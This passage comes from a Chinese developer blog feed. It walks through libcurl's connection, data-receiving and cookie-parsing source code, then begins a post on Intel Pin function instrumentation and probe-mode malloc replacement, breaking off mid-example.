14 - transfer data */</div><div class="line">  CURLM_STATE_TOOFAST,      /* 15 - wait because limit-rate exceeded */</div><div class="line">  CURLM_STATE_DONE,         /* 16 - post data transfer operation */</div><div class="line">  CURLM_STATE_COMPLETED,    /* 17 - operation complete */</div><div class="line">  CURLM_STATE_MSGSENT,      /* 18 - the operation complete message is sent */</div><div class="line">  CURLM_STATE_LAST          /* 19 - not a true state, never use this */</div><div class="line">&#125; CURLMstate;</div><div class="line"></div><div class="line"></div><div class="line">//单独看connect</div><div class="line">CURLcode Curl_connect(struct Curl_easy *data,</div><div class="line">                      struct connectdata **in_connect,</div><div class="line">                      bool *asyncp,</div><div class="line">                      bool *protocol_done)</div><div class="line">&#123;</div><div class="line">    static CURLcode create_conn(struct Curl_easy *data,</div><div class="line">                            struct connectdata **in_connect,</div><div class="line">                            bool *async)</div><div class="line">    -&gt;</div><div class="line">    static CURLcode resolve_server(struct Curl_easy *data,</div><div class="line">                               struct connectdata *conn,</div><div class="line">                               bool *async)</div><div class="line">                               </div><div class="line">&#125;  </div><div class="line"></div><div class="line">result = Curl_async_resolved(data-&gt;easy_conn, &amp;protocol_connect);-&gt;</div><div class="line">result = Curl_setup_conn(conn, protocol_done);-&gt;</div><div class="line">result = Curl_connecthost(conn, conn-&gt;dns_entry);-&gt;</div><div class="line">result = singleipconnect(conn, conn-&gt;tempaddr[0], &amp;(conn-&gt;tempsock[0]));-&gt;</div><div class="line">static CURLcode singleipconnect(struct connectdata *conn,</div><div class="line">                                const Curl_addrinfo *ai,</div><div class="line">                                curl_socket_t *sockp)</div><div class="line">-&gt;</div><div class="line">CURLcode Curl_socket(struct connectdata *conn,</div><div class="line">                     const Curl_addrinfo *ai,</div><div class="line">                     struct Curl_sockaddr_ex *addr,</div><div class="line">                     curl_socket_t *sockfd)</div><div class="line">                     </div><div class="line">//Crul对socket等的封装</div><div class="line">//\lib\connect.c</div><div class="line">CURLcode Curl_socket(struct connectdata *conn,</div><div class="line">                     const Curl_addrinfo *ai,</div><div class="line">                     struct Curl_sockaddr_ex *addr,</div><div class="line">                     curl_socket_t *sockfd)</div><div class="line">CURLcode Curl_connecthost(struct connectdata *conn,  /* context */</div><div class="line">                          const struct Curl_dns_entry *remotehost)           int Curl_closesocket(struct connectdata *conn,</div><div class="line">                      curl_socket_t sock)</div><div class="line">curl_socket_t Curl_getconnectinfo(struct Curl_easy *data,</div><div class="line">                                  struct connectdata **connp)</div></pre></td></tr></table></figure> <h2 id="3-接受数据时"><a href="#3-接受数据时" class="headerlink" title="3. 接受数据时"></a>3. 接受数据时</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">static CURLMcode multi_runsingle(struct Curl_multi *multi,</div><div class="line">                                 struct timeval now,</div><div class="line">                                 struct Curl_easy *data)//\lib\multi.c</div><div class="line">-&gt;</div><div class="line">CURLcode Curl_readwrite(struct connectdata *conn,</div><div class="line">                        struct Curl_easy *data,</div><div class="line">                        bool *done)//\lib\transfer.c</div><div class="line">&#123;</div><div class="line"> /* We go ahead and do a read if we have a readable socket or if</div><div class="line">     the stream was rewound (in which case we have data in a</div><div class="line">     buffer) */</div><div class="line">  if((k-&gt;keepon &amp; KEEP_RECV) &amp;&amp;</div><div class="line">     ((select_res &amp; CURL_CSELECT_IN) || conn-&gt;bits.stream_was_rewound)) &#123;</div><div class="line"></div><div class="line">    result = readwrite_data(data, conn, k, &amp;didwhat, done);//</div><div class="line">    if(result || *done)</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">-&gt;</div><div class="line">static CURLcode readwrite_data(struct Curl_easy *data,</div><div class="line">                               struct connectdata *conn,</div><div class="line">                               struct SingleRequest *k,</div><div class="line">                               int *didwhat, bool *done)//\lib\transfer.c</div><div class="line">&#123;</div><div class="line">    //接受头部</div><div class="line">    result = Curl_http_readwrite_headers(data, conn, &amp;nread, &amp;stop_reading);</div><div class="line">    //-&gt;</div><div class="line">    //CURLcode Curl_client_write(struct connectdata *conn,</div><div class="line">    //                       int type,</div><div class="line">    //                       char *ptr,</div><div class="line">    //                       size_t len)//lib\sendf.c</div><div class="line">    </div><div class="line">    //接受数据</div><div class="line">    result = Curl_client_write(conn, CLIENTWRITE_BODY, k-&gt;str,</div><div class="line">                                           nread);</div><div class="line">    //-》</div><div class="line">    //Curl_client_write-&gt;Curl_client_chop_write-&gt; 调用回调函数</div><div class="line">    //</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line">//调用回调函数</div><div class="line">CURLcode Curl_client_chop_write(struct connectdata *conn,</div><div class="line">                                int type,</div><div class="line">                                char * ptr,</div><div class="line">                                size_t len)</div><div class="line">&#123;               </div><div class="line"></div><div class="line">    curl_write_callback writeheader = NULL;</div><div class="line">    curl_write_callback writebody = NULL;</div><div class="line">    //...</div><div class="line">    </div><div class="line">    /* Determine the callback(s) to use. */</div><div class="line">  if(type &amp; CLIENTWRITE_BODY)</div><div class="line">    writebody = data-&gt;set.fwrite_func;</div><div class="line">    </div><div class="line">    if(writebody) &#123;</div><div class="line">        //调用回调函数</div><div class="line">      size_t wrote = writebody(ptr, 1, chunklen, data-&gt;set.out);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure> <h2 id="4-cookie相关"><a href="#4-cookie相关" class="headerlink" title="4. cookie相关"></a>4. cookie相关</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div></pre></td><td class="code"><pre><div class="line">//解析指定的cookie文件</div><div class="line">//支持# Netscape HTTP Cookie File和Mozilla cookie</div><div class="line">CURLcode Curl_pretransfer(struct Curl_easy *data)//lib\transfer.c</div><div class="line">&#123;</div><div class="line"> /* If there is a list of cookie files to read, do it now! */</div><div class="line">  if(data-&gt;change.cookielist)//cookie文件列表</div><div class="line">    Curl_cookie_loadfiles(data);</div><div class="line">&#125;</div><div class="line">-&gt;</div><div class="line">void Curl_cookie_loadfiles(struct Curl_easy *data)//lib\cookie.c</div><div class="line">-&gt;</div><div class="line">//读取cookie文件，初始化cookie结构</div><div class="line">struct CookieInfo *Curl_cookie_init(struct Curl_easy *data,</div><div class="line">                                    const char *file,</div><div class="line">                                    struct CookieInfo *inc,</div><div class="line">                                    bool newsession)//lib\cookie.c</div><div class="line">-&gt;</div><div class="line">//lineptr是从cookie.txt中读取的每行数据，解析数据，插入CookieInfo链</div><div class="line">struct Cookie *</div><div class="line">Curl_cookie_add(struct Curl_easy *data,</div><div class="line">                /* The &apos;data&apos; pointer here may be NULL at times, and thus</div><div class="line">                   must only be used very carefully for things that can deal</div><div class="line">                   with data being NULL. Such as infof() and similar */</div><div class="line"></div><div class="line">                struct CookieInfo *c,</div><div class="line">                bool httpheader, /* TRUE if HTTP header-style line */</div><div class="line">                char *lineptr,   /* first character of the line */</div><div class="line">                const char *domain, /* default domain */</div><div class="line">                const char *path)   /* full path used when this cookie is set,</div><div class="line">                                       used to get default path for the cookie</div><div class="line">                                       unless set */</div><div class="line">&#123;</div><div class="line">//...</div><div class="line">clist = c-&gt;cookies;</div><div class="line">  replace_old = FALSE;</div><div class="line">  while(clist) &#123;</div><div class="line">    if(Curl_raw_equal(clist-&gt;name, co-&gt;name)) &#123;</div><div class="line">      /* the names are identical */</div><div class="line"></div><div class="line">      if(clist-&gt;domain &amp;&amp; co-&gt;domain) &#123;</div><div class="line">        if(Curl_raw_equal(clist-&gt;domain, co-&gt;domain))</div><div class="line">          /* The domains are identical */</div><div class="line">          replace_old=TRUE;</div><div class="line">      &#125;</div><div class="line">      else if(!clist-&gt;domain &amp;&amp; !co-&gt;domain)</div><div class="line">        replace_old = TRUE;</div><div class="line"></div><div class="line">      if(replace_old) &#123;</div><div class="line">        /* the domains were identical */</div><div class="line"></div><div class="line">        if(clist-&gt;spath &amp;&amp; co-&gt;spath) &#123;</div><div class="line">          if(Curl_raw_equal(clist-&gt;spath, co-&gt;spath)) &#123;</div><div class="line">            replace_old = TRUE;</div><div class="line">          &#125;</div><div class="line">          else</div><div class="line">            replace_old = FALSE;</div><div class="line">        &#125;</div><div class="line">        else if(!clist-&gt;spath &amp;&amp; !co-&gt;spath)</div><div class="line">          replace_old = TRUE;</div><div class="line">        else</div><div class="line">          replace_old = FALSE;</div><div class="line"></div><div class="line">      &#125;</div><div class="line">      //。。。</div><div class="line"></div><div class="line">      if(replace_old) &#123;</div><div class="line">        co-&gt;next = clist-&gt;next; /* get the next-pointer first */</div><div class="line"></div><div class="line">        *clist = *co;  /* then store all the new data */</div><div class="line"></div><div class="line">        free(co);   /* free the newly alloced memory */</div><div class="line">        co = clist; /* point to the previous struct instead */</div><div class="line"></div><div class="line">        /* We have replaced a cookie, now skip the rest of the list but</div><div class="line">           make sure the &apos;lastc&apos; pointer is properly set */</div><div class="line">        do &#123;</div><div class="line">          lastc = clist;</div><div class="line">          clist = clist-&gt;next;</div><div class="line">        &#125; while(clist);</div><div class="line">        break;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    lastc = clist;</div><div class="line">    clist = clist-&gt;next;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  if(c-&gt;running)</div><div class="line">    /* Only show this when NOT reading the cookies from a file */</div><div class="line">    infof(data, &quot;%s cookie %s=\&quot;%s\&quot; for domain %s, path %s, &quot;</div><div class="line">          &quot;expire %&quot; CURL_FORMAT_CURL_OFF_T &quot;\n&quot;,</div><div class="line">          replace_old?&quot;Replaced&quot;:&quot;Added&quot;, co-&gt;name, co-&gt;value,</div><div class="line">          co-&gt;domain, co-&gt;path, co-&gt;expires);</div><div class="line"></div><div class="line">  if(!replace_old) &#123;</div><div class="line">    /* then make the last item point on this new one */</div><div class="line">    if(lastc)</div><div class="line">      lastc-&gt;next = co;</div><div class="line">    else</div><div class="line">      c-&gt;cookies = co;</div><div class="line">    c-&gt;numcookies++; /* one more cookie in the jar */</div><div class="line">  &#125;</div><div class="line"> //...</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h1 id="0x06-其他"><a href="#0x06-其他" class="headerlink" title="0x06. 其他"></a>0x06. 其他</h1><p>封装了一份简单的http类，支持GET、POST、ajax，代码比较简单，有需要的可以拿来用，后续可能会更新</p> <p>源码：<a href="https://github.com/anhkgg/minihttp" target="_blank" rel="external">https://github.com/anhkgg/minihttp</a></p> <p><a href="https://curl.haxx.se/libcurl/" target="_blank" rel="external">https://curl.haxx.se/libcurl/</a></p> <p><a href="http://www.liyuduo.com/?p=1103" target="_blank" rel="external">https://curl.haxx.se/libcurl/3</a></p> <p><a href="http://blog.csdn.net/breaksoftware/article/details/45874197" target="_blank" rel="external">http://blog.csdn.net/breaksoftware/article/details/45874197</a></p> <p>转载请注明出处：<a href="http://anhkgg.github.io/liburl-use-minihttp/">http://anhkgg.github.io/liburl-use-minihttp/</a></p> ]]></content>          <summary type="html">            &lt;h1 id=&quot;0x00-前面&quot;&gt;&lt;a href=&quot;#0x00-前面&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前面&quot;&gt;&lt;/a&gt;0x00. 前面&lt;/h1&gt;&lt;p&gt;以前用Wininet api包了一个简单易用的http请求的lib，但是居然会遇到系统不支持的情况，难道要我自己用socket写吗？no way！&lt;/p&gt; &lt;p&gt;以前知道liburl，第一次使用，啥都不知道，反正感觉挺强大的&lt;/p&gt; &lt;p&gt;&amp;lt; libcurl is a free and easy-to-use client-side URL transfer library, supporting DICT, FILE, FTP, FTPS, Gopher, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMTP, SMTPS, Telnet and TFTP.&lt;/p&gt; &lt;p&gt;须知，我这里只用到了HTTP&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;https://curl.haxx.se/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;home: https://curl.haxx.se/&lt;/a&gt;&lt;/p&gt; &lt;p&gt;&lt;a href=&quot;https://curl.haxx.se/libcurl/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;document: https://curl.haxx.se/libcurl/&lt;/a&gt;&lt;/p&gt; &lt;p&gt;其实使用比较简单，但对我没有认真看过文档，并且没有找到好资料的情况下，我遇到了很多弯路，并且想吐槽实例代码，搞那么复杂干嘛，还没有我想要的代码。&lt;/p&gt;          </summary>            <category term="code" scheme="https://anhkgg.github.io/categories/code/"/>                 <category term="libcurl" scheme="https://anhkgg.github.io/tags/libcurl/"/>            <category term="http" scheme="https://anhkgg.github.io/tags/http/"/>            <category term="minihttp" scheme="https://anhkgg.github.io/tags/minihttp/"/>            <category term="get_post_ajax" scheme="https://anhkgg.github.io/tags/get-post-ajax/"/>        </entry>      <entry>     <title>pin使用小记-函数分析</title>     <link href="https://anhkgg.github.io/pin-use-note-function-analysis/"/>     <id>https://anhkgg.github.io/pin-use-note-function-analysis/</id>     <published>2016-07-28T05:27:33.000Z</published>     <updated>2016-07-28T05:42:35.293Z</updated>          <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>相关：<a href="https://software.intel.com/en-us/articles/pintool/" target="_blank" rel="external">pin是什么</a>  <a href="https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/" target="_blank" rel="external">pin可以做什么</a>  <a href="https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/index.html#EXAMPLES" target="_blank" rel="external">pin examples</a></p> <p>此次使用pin目的，是为了能够应用pin在函数分析方面的功能，以及XXXInsertCall的功能</p> <p>由于此前对pin了解不够深入，以为可以实现相应功能，哪知撞了南墙才知道pin也有些许局限。</p> <p>下面将我对了解到的pin可以实现以及不能实现的各种坑写作笔记。</p> <a id="more"></a> <h1 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h1><h2 id="RTN"><a href="#RTN" class="headerlink" title="RTN"></a>RTN</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PIN_CALLBACK  LEVEL_PINCLIENT::RTN_AddInstrumentFunction (RTN_INSTRUMENT_CALLBACK fun, VOID *val)</div></pre></td></tr></table></figure> <p>使用<code>RTN_AddInstrumentFunction</code>即可对分析目标添加函数级插桩，在设置的回调中可以获取函数的各种信息。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">typedef VOID(*) LEVEL_PINCLIENT::RTN_INSTRUMENT_CALLBACK(RTN rtn, VOID *v)</div></pre></td></tr></table></figure> <p>回调函数中rtn就表示被插桩的该函数，通过RTN_XXX相关函数可以获取函数的名字、地址、大小、范围等等</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">const string &amp;  LEVEL_PINCLIENT::RTN_Name (RTN x)</div><div class="line">ADDRINT  LEVEL_PINCLIENT::RTN_Address (RTN rtn)</div><div class="line">USIZE  LEVEL_PINCLIENT::RTN_Size (RTN rtn)</div><div class="line">USIZE  LEVEL_PINCLIENT::RTN_Range (RTN rtn)</div></pre></td></tr></table></figure> <p>不得不提一个函数，<code>RTN_FindByName</code>类似于GetProcAddress，可以获取img(模块对象)中指定名字的rtn对象。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RTN  LEVEL_PINCLIENT::RTN_FindByName (IMG img, const CHAR *name)</div></pre></td></tr></table></figure> <p>也可以通过地址来获取对应的rtn对象，但是如果对应函数没有符号信息，获取到的rtn是不对的，会找到最小范围内满足的rtn对象</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RTN  LEVEL_PINCLIENT::RTN_FindByAddress (ADDRINT address)</div></pre></td></tr></table></figure> <h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>初以为RTN表示所有函数对象，像IDA一样能将基本所有函数分析出来，哪知吃了不看文档的亏(虽然知道使用RTN之前需要调用符号相关初始化)。</p> <blockquote> <p>A RTN represents the functions/routines/procedures typically produced by a compiler for a procedural programming language such as C. Pin finds routines by using the symbol table information. You must call PIN_InitSymbols() so that symbol table information will be available. Can be accessed at instrumentation time and analysis time.</p> </blockquote> <p>也就是说pin是根据符号信息来分析函数，生成RTN对象。那么没有符号信息的函数，像IDA中的是那么<code>sub_xxxx</code>也就没有可能这么方便的使用了。</p> <p>当然，如果需求是对有符号信息的函数，比如对系统函数的分析，那么RTN还是能够提供相当nb的功能的。记得调用<code>PIN_InitSymbols()</code>初始化符号信息。</p> <h3 id="maybe-hook"><a href="#maybe-hook" class="headerlink" title="maybe hook"></a>maybe hook</h3><p>pin可以实现类似于对函数hook的功能，有两类，第一类用在JIT模式下，另一类用在Probe模式下。</p> <p>先说JIT模式下使用的<code>RTN_InsertCall</code>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VOID LEVEL_PINCLIENT::RTN_InsertCall ( RTN  rtn,</div><div class="line">IPOINT  action,</div><div class="line">AFUNPTR  funptr,</div><div class="line">  ...  </div><div class="line">)</div></pre></td></tr></table></figure> <blockquote> <p>Insert call relative to a rtn.</p> </blockquote> <p>使用这个函数注册一个回调函数，该回调函数可以在rtn调用前（IPOINT_BEFORE）或者调用后（IPOINT_AFTER）被调用。可以给回调函数传递各种信息，使用第三个参数之后的内容传递。</p> <p>pin中各种XXX_InsertCall传递参数有一个统一的类型<code>IARG_TYPE</code>。这里简单说一下传递方法，具体要根据<code>IARG_TYPE</code>说明来使用，大致分为两种：</p> <ol> <li>只需要指定IARG_XXX类型，pin自己传递具体值给回调函数</li> <li>指定IARG_XXX类型，开发者传递类型对应的具体值</li> </ol> <p>必须以IARG_END表示参数结束。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//pin传递值，只需要指定类型即可</div><div class="line">IARG_RETURN_IP  Type: ADDRINT. Return address for function call, valid only at the function entry point.</div><div class="line">IARG_ORIG_FUNCPTR  Type: AFUNPTR. Function pointer to the relocated entry of the original uninstrumented function.</div><div class="line">IARG_PROTOTYPE  Type: PROTO. The function prototype of the application function. See Prototypes.</div><div class="line">IARG_THREAD_ID  Type: THREADID. Application thread id.</div><div class="line">//开发者需要自己传递具体值</div><div class="line">IARG_ADDRINT  Type: ADDRINT. Constant value (additional arg required).</div><div class="line">IARG_PTR  Type: &quot;VOID *&quot;. Constant value (additional pointer arg required).</div><div class="line">IARG_BOOL  Type: BOOL. Constant (additional BOOL arg required).</div><div class="line">IARG_UINT32  Type: UINT32. Constant (additional integer arg required).</div><div class="line">IARG_INST_PTR  Type: ADDRINT. The address of the instrumented instruction. This value does not change at IPOINT_AFTER. This is simply shorthand for IARG_ADDRINT, INS_Address(ins).</div><div class="line">IARG_REG_VALUE  Type: ADDRINT for integer register. Value of a register (additional register arg required) REG: Register Object Basically, this cannot be used to retrieve the value of registers whose size is different than ADDRINT&apos;s (i.e.: x87/XMM/YMM/ZMM registers) or registeres which are not architectural (REG_PIN_*), but there are some exceptions for this rule.</div></pre></td></tr></table></figure> <p>举个例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">char* p = &quot;this is log info.&quot;;</div><div class="line">BOOL log_falg = TRUE;</div><div class="line">ADDRINT addr = RTN_Address(rtn);</div><div class="line">RTN_InsertCall(rtn, IPOINT_BEFORE, RtnClk, </div><div class="line">                IARG_ORIG_FUNCPTR, </div><div class="line">                IARG_RETURN_IP, </div><div class="line">                IARG_ADDRINT, addr, </div><div class="line">                IARG_PTR, p,</div><div class="line">                IARG_BOOL, log_falg,</div><div class="line">                IARG_END);</div><div class="line">                </div><div class="line">VOID RtnClk(ADDRINT OrigFunc, ADDRINT retIp, ADDRINT addr, void* log, BOOL log_falg)</div><div class="line">&#123;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p> <p>Probe模式下使用下面两个函数，其实没有弄明白这两个函数和JIT模式下RTN_InserCall的区别，暂时就不做深入了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">VOID  LEVEL_PINCLIENT::RTN_InsertCallProbed (RTN orgRtn, IPOINT action, AFUNPTR funptr,...)</div><div class="line">VOID  LEVEL_PINCLIENT::RTN_InsertCallProbedEx (RTN orgRtn, IPOINT action, PROBE_MODE mode, AFUNPTR funptr,...)</div></pre></td></tr></table></figure> <blockquote> <p>Insert a call to an analysis routine relative to a RTN.</p> </blockquote> <p>其他<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">RTN_ReplaceProbed</div><div class="line">RTN_ReplaceProbedEx</div></pre></td></tr></table></figure></p> <p>下面一个示例，可能更符合对函数hook的理解，这里使用到的是RTN_ReplaceSignatureProbed</p> <p>这种方式需要向函数hook一样指定函数原型，也就是需要知道函数需要哪些参数，调用方式等等。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">typedef VOID * ( *FP_MALLOC )( size_t );</div><div class="line"></div><div class="line">// This is the replacement routine.</div><div class="line">//</div><div class="line">VOID * NewMalloc( FP_MALLOC orgFuncptr, UINT32 arg0, ADDRINT returnIp )</div><div class="line">&#123;</div><div class="line">    // Normally one would do something more interesting with this data.</div><div class="line">    //</div><div class="line">    cout &lt;&lt; &quot;NewMalloc (&quot;</div><div class="line">         &lt;&lt; hex &lt;&lt; ADDRINT ( orgFuncptr ) &lt;&lt; &quot;, &quot; </div><div class="line">         &lt;&lt; dec &lt;&lt; arg0 &lt;&lt; &quot;, &quot; </div><div class="line">         &lt;&lt; hex &lt;&lt; returnIp &lt;&lt; &quot;)&quot;</div><div class="line">         &lt;&lt; endl &lt;&lt; flush;</div><div class="line"></div><div class="line">    // Call the relocated entry point of the original (replaced) routine.</div><div class="line">    //</div><div class="line">    VOID * v = orgFuncptr( arg0 );</div><div class="line"></div><div class="line">    return v;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">// Pin calls this function every time a new img is loaded.</div><div class="line">// It is best to do probe replacement when the image is loaded,</div><div class="line">// because only one thread knows about the image at this time.</div><div class="line">//</div><div class="line">VOID ImageLoad( IMG img, VOID *v )</div><div class="line">&#123;</div><div class="line">    // See if malloc() is present in the image.  If so, replace it.</div><div class="line">    //</div><div class="line">    RTN rtn = RTN_FindByName( img, &quot;malloc&quot; );</div><div class="line">    </div><div class="line">    if (RTN_Valid(rtn))</div><div class="line">    &#123;</div><div class="line">        cout &lt;&lt; &quot;Replacing malloc in &quot; &lt;&lt; IMG_Name(img) &lt;&lt; endl;</div><div class="line">        </div><div class="line">        // Define a function prototype that describes the application routine</div><div class="line">        // that will be replaced.</div><div class="line">        //</div><div class="line">        PROTO proto_malloc = PROTO_Allocate( PIN_PARG(void *), CALLINGSTD_DEFAULT,</div><div class="line">                                             &quot;malloc&quot;, PIN_PARG(int), PIN_PARG_END() );</div><div class="line">        </div><div class="line">        // Replace the application routine with the replacement function.</div><div class="line">        // Additional arguments have been added to the replacement routine.</div><div class="line">        //</div><div class="line">        RTN_ReplaceSignatureProbed(rtn, AFUNPTR(NewMalloc),</div><div class="line">                                   IARG_PROTOTYPE, proto_malloc,</div><div class="line">                                   IARG_ORIG_FUNCPTR,</div><div class="line">                                   IARG_FUNCARG_ENTRYPOINT_VALUE, 0,</div><div class="line">                                   IARG_RETURN_IP,</div><div class="line">                                   IARG_END);</div><div class="line"></div><div class="line">        // Free the function prototype.</div><div class="line">        //</div><div class="line">        PROTO_Free( proto_malloc );</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <h3 id="can-be-hook"><a href="#can-be-hook" class="headerlink" title="can be hook"></a>can be hook</h3><p>另外pin还提供对任意地址做hook的函数，也就是PIN_InsertCallProbed。</p> <p>显然这也是用于Probe模式下的函数，顺便就说一下Probe模式下需要注意，调用PIN_StartProgramProbed()启动目标进程，这样子之后，JIT模式的很多函数就不能使用了。正是因为这个，如RTN、INS、Trace插桩函数不能使用，只能通过IMG插桩，在回调中进行函数的分析，想下面的实例代码中一样。</p> <p>这样就给我要实现的功能带来了麻烦，无法通过INS插桩分析call xxx的目标地址，更别说后续的使用PIN_InsertCallProbed来对函数hook了，这样子PIN_InsertCallProbed对我来说显得很鸡肋。</p> <blockquote> <p>PIN_StartProgramProbed() must be used when using this API.<br>Use RTN_IsSafeForProbedInsertion() to determine if a function is a suitable candidate for probed function insertion.</p> </blockquote> <p>不过，我觉得这种模式更类似于函数hook，不会像上面指定IPOINT_BEFORE，它更像hook一样只是对函数进行inline hook（或者其他方式）。</p> <p>使用示例(代码来自于pin例子源码<code>source\tools\Probes\insert_call_probed.cpp</code>)：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div 